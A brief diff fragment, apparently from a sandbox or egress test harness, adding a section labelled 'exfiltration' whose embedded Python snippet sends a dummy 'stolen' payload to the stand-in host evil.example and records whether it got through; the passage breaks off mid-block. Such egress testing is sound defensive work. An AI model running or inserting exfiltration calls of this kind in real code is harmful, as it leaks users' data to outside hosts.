+# ---- 8. exfiltration --------------------------------------------------------
+EXFIL_PY = """import json, urllib.request as u
+payload = b"stolen: " + b"A" * 2048
+out = {}
+try:
+    u.urlopen(u.Request("https://evil.example/collect", data=payload), timeout=8)
+    out["via_proxy"] = "SENT"
+except Exception as e:
